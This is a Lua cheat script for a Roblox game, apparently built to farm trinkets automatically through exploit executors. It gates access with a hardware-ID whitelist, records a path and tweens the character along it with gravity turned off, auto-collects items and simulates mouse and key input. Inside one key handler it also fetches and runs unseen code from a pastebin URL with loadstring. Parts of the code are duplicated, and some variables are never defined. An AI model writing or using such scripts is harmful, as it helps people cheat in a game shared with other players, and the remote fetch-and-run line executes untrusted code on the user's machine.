local keys = {"$B&E(H+MbQeThWmZ",
    "H+MbQeThWmZq4t7w"}
local hwids = {
    "111ff687575ee3631836b9c9567660f0e2a50be7ff80dd7351fdbb9373832468758d008a3a1cea4181a1c3e101e73c074f7f0fd98a3ed05806c529f7c5508fdf",
    "f647159585b6c1bda3721204ebb2ee3f0d5cebf3a0625afe803111d2db2457d9b3a6ca93069bb281e0415aeabdda3aa0514a85e45371c1bcf910b9152b369845",
    "0240a6ea9cfef09494618e01115d6b658de0a68298e9b5b063f19a2168dabd9f159ddf8e086e847049b238477efa0e94eeb77bbc6dbd2efcf7ae4e0ca84cc0ab"
}
local first = true
local first2 = true
local first3 = true
local count = 0
local count2 = 0
local quickCount = 0
local savePoints = {}
local fileSavePoints = {}
local isAutoPickup = true
local toggle = true
local toggle2 = false
local idiotProof = false
local panic = false
local autoDropItems = {
    "Scroll of Sraunus"
}
local autoUseItems = {
    "Scroll of Trahere",
    "Scroll of Telorum",
    "Ice Essence"
}
input = game:GetService("UserInputService")
tweenService = game:GetService("TweenService")

local http_request = http_request;
if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200;
            Body = request(tb.Url, tb.Method, (tb.Body or ''))
        }
    end
end
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
local hwid = "";

for i, v in next, hwid_list do
    if decoded.headers[v] then
        hwid = decoded.headers[v];
        break
    end
end 

for i,v in pairs(hwids) do
    if v == hwid then
        break
    elseif v ~= hwid and i == #hwids then
        game.Players.LocalPlayer:Kick("Not whitelisted!")
    end
end
for i,v in pairs(keys) do
    if v == key then
        break
    elseif v ~= key and i == #keys then
        game.Players.LocalPlayer:Kick("Not whitelisted!")
    end
end
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
local hwid = "";

for i, v in next, hwid_list do
    if decoded.headers[v] then
        hwid = decoded.headers[v];
        break
    end
end 
function calculateTime(s, d)
    local time = d/s
    return time
end

function detectTrinkets(trinket)
    local part
    local returned
    if trinket.Name == "Part" and trinket:FindFirstChild("ID") then
        returned = true
    else
        returned = false
    end
    return returned, trinket
end

function autoPickup(connectTrinket)
    spawn(function()
        local player = game.Players.LocalPlayer
        while isAutoPickup do
            local leWorkspace = game.Workspace:GetChildren()
            for i,v in pairs(leWorkspace) do
                local _, trinket = detectTrinkets(v)
                if _ then
                    local part = trinket:WaitForChild("Part")
                    local clickdetector = part:WaitForChild("ClickDetector")
                    local maxDistance = clickdetector.MaxActivationDistance - 0.1
                    while not player.Character:FindFirstChild("Head") do 
                        wait(0.1)
                    end
                    if player:DistanceFromCharacter(part.Position) < maxDistance and player.Character.Head then
                        fireclickdetector(clickdetector)
                    end
                    if connectTrinket then
                        local part = connectTrinket:FindFirstChild("Part")
                        local clickdetector2 = part:FindFirstChild("ClickDetector")
                        if player:DistanceFromCharacter(part.Position) < maxDistance and player.Character.Head then
                            fireclickdetector(clickdetector2)
                        end
                    end         
                end
            end
            wait()
        end
    end)
end


input.InputBegan:Connect(function(key)
    if key.KeyCode == Enum.KeyCode.K then
        local start = Instance.new("Sound", game.Workspace)
        local stop = Instance.new("Sound", game.Workspace)
        start.SoundId = "rbxassetid://4448964821"
        stop.SoundId = "rbxassetid://4448964198"
        if idiotProof then
            stop:Play()
            idiotProof = false
        else
            start:Play()
            idiotProof = true
        end
    end
    if key.KeyCode == Enum.KeyCode.E then 
        if idiotProof then
            if first2 then
                writefile("path.txt", "")
                first2 = false
            end
            if not game.Workspace:FindFirstChild("folderDubs") then
                print("FOLDER DEBUG CHECK")
                folderDubs = Instance.new("Folder", game.Workspace)
                folderDubs.Name = "folderDubs"
            end
            local sphere = Instance.new('Part')
            sphere.Size = Vector3.new(1, 1, 1) 
            sphere.Shape = Enum.PartType.Ball
            sphere.Anchored = true
            sphere.CanCollide = false
            sphere.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 
            sphere.Parent = game.Workspace.folderDubs 
            sphere.Material = Enum.Material.Neon
            count2 = count2 + 1
            local folderForDubs = folderDubs:GetChildren()
            appendfile("path.txt", sphere.Position.x.." "..sphere.Position.y.." "..sphere.Position.z.." ")
            local stuff = readfile("path.txt")
            folderCopy = folderDubs:Clone()
            table.insert(fileSavePoints, count2, stuff)
            table.insert(savePoints, count2, folderCopy)
            print("DEBUG SAVE POINT FILE CHECK: ",stuff)
            print("DEBUG SAVE POINT REVERSION: ",count2)
        end
    end
    if key.KeyCode == Enum.KeyCode.J then
        if idiotProof then
            print("Another precheck")
            if first2 then
                writefile("path.txt", "")
                first2 = false
            end
            if not game.Workspace:FindFirstChild("folderDubs") then
                print("FOLDER DEBUG CHECK")
                folderDubs = Instance.new("Folder", game.Workspace)
                folderDubs.Name = "folderDubs"
            end
            local sphere = Instance.new('Part')
            sphere.Size = Vector3.new(1, 1, 1) -- Size, 1 is 1 stud by 1 stud.
            sphere.Shape = Enum.PartType.Ball -- Make it a sphere
            sphere.Anchored = true
            sphere.Color = Color3.fromRGB(0, 0, 255)
            sphere.CanCollide = false
            sphere.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame -- Position it
            sphere.Parent = game.Workspace.folderDubs -- Parent it
            sphere.Material = Enum.Material.Neon
            appendfile("path.txt", "("..sphere.Position.x.." "..sphere.Position.y.." "..sphere.Position.z.." ")
            count2 = count2 + 1
            folderCopy = folderDubs:Clone()
            print("DEBUG TYPE CHECK: ",type(count2))
            table.insert(savePoints, count2, folderCopy)
            local stuff = readfile("path.txt")
            table.insert(fileSavePoints, count2, stuff)
            print("DEBUG SAVE POINT REVERSION: ",count2)
        end
    end
    if key.KeyCode == Enum.KeyCode.Y then
        if idiotProof then
            folderDubs:Destroy()
            folderDubs = Instance.new("Folder", game.Workspace)
            folderDubs.Name = "folderDubs"
            delfile("path.txt")
            first2 = true
            count = 0
            count2 = 0
        end
    end
    if key.KeyCode == Enum.KeyCode.T then
        if idiotProof then
            count2 = count2 - 1
            folderDubs:Destroy()
            folderDubs = savePoints[count2]:Clone()
            folderDubs.Parent = game.Workspace
            writefile("path.txt", fileSavePoints[count2])
            print("DEBUG SAVE POINT REVERSION: ",count2)
        end
    end
    if key.KeyCode == Enum.KeyCode.M then
        if not panic then
            print("PANIC MODE ENABLED")
            panic = true
        else
            print("PANIC MODE DISABLED")
            panic = false
        end
    end
    if key.KeyCode == Enum.KeyCode.H then
        if idiotProof then
            if toggle then
                toggle = false
                autoPickup()
                local newCoords = {}
                local CFrames = {} 
                local stopPoints = {}
                local stopPoints2 = {}
                if not isfile("path.txt") then return end
                local stuff = readfile("path.txt")
                print(stuff)
                spawn(function()
                    loadstring(game:HttpGet(("https://pastebin.com/raw/ERDp2x5W"),true))()
                end)
                for word in stuff:gmatch("(.-)".." ") do  
                    count = count + 1
                    print("COUNT CHECK: ",count)
                    if word:sub(1, 1) == "(" then
                        print("STOP POINT FOUND: ",count)
                        table.insert(stopPoints, count)
                        table.insert(newCoords, string.sub(word, 2))
                    else
                        table.insert(newCoords, word)
                    end
                end
                for i,v in pairs(newCoords) do
                    print("CHECKING COORD TABLE: ", i, v)
                end
                for i,v in pairs(newCoords) do
                    if (i+2)%3 == 0 then
                        table.insert(CFrames, CFrame.new(v, newCoords[i+1], newCoords[i+2]))
                    end
                end
                for i,v in pairs(stopPoints) do
                    print("STOP POINTS ",(v+2)/3)
                end
                for i,v in pairs(stopPoints) do
                    if (v + 2) % 3 == 0 then
                        table.insert(stopPoints2, v)
                    end
                    print("CFRAME LOOP DEBUG: ",v)
                end
                while true do
                    if toggle then return end
                    spawn(function()
                        while true do
                            if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then toggle = true count = 0  end
                            wait()
                        end
                    end)
                    game.Workspace.Gravity = 0
                    for i,v in pairs(CFrames) do
                        if toggle then return end
                        if first then
                            local time = calculateTime(speed, game.Players.LocalPlayer:DistanceFromCharacter(Vector3.new(v.x, v.y, v.z)))
                            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = v}):Play()
                            game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "0"
                            wait(time)
                            for i2,vd in pairs(stopPoints2) do
                                if i == (vd+2)/3 then
                                    game.Players.LocalPlayer.Character.Torso.Anchored = true
                                    wait(trinketSpawnWaitTimes)
                                    game.Players.LocalPlayer.Character.Torso.Anchored = false
                                end
                                            writefile("crashlogs.txt", "CRASHED POINT 4")
                            end 
                        else
                            local temp = CFrames[i+1]
                            local temp1 = Vector3.new(v.x, v.y, v.z)
                            local temp2 = Vector3.new(temp.x, temp.y, temp.z)
                            local distance = (temp1 - temp2).magnitude
                            local time = calculateTime(speed, distance)
                            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = v}):Play()
                            game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "0"
                                        wait(time)
                            for i2, v2 in pairs(stopPoints2) do
                                if i == v2/3 then
                                    game.Players.LocalPlayer.Character.Torso.Anchored = true
                                    wait(trinketSpawnWaitTimes)
                                    game.Players.LocalPlayer.Character.Torso.Anchored = false
                                end
                            end
                        end
                    end
                if toggle then return end
                toggle2 = true
                game.Workspace.Gravity = 196.2
                wait(lootCycleWaitTimes*60)
                toggle2 = false
                end
            else
                count = 0
                toggle = true
                game.Workspace.Gravity = 196.2
                game.Players.LocalPlayer.Character.Torso.Anchored = false
            end
        end
    end
end)

game.Players.LocalPlayer.Backpack.ChildAdded:Connect(function(item)
    if toggle2 then
        for i,v in pairs(autoUseItems) do
            if item.Name == v and iswindowactive() then
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(item)
                mousemoveabs(971, 232)
                mouse1click()
            end
        end
        for i,v in pairs(autoDropItems) do
            if item.Name == v then
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(item)
                keypress(VK_BACK)
                keyrelease(VK_BACK)
            end
        end
    end
end)

game.Players.PlayerRemoving:Connect(function()
    if panic then
        repeat wait() until not game.Players.LocalPlayer.Character:FindFirstChild("Danger")
        game.Players.LocalPlayer.Character:BreakJoints()
        toggle = true
        panic = false
    end
end)
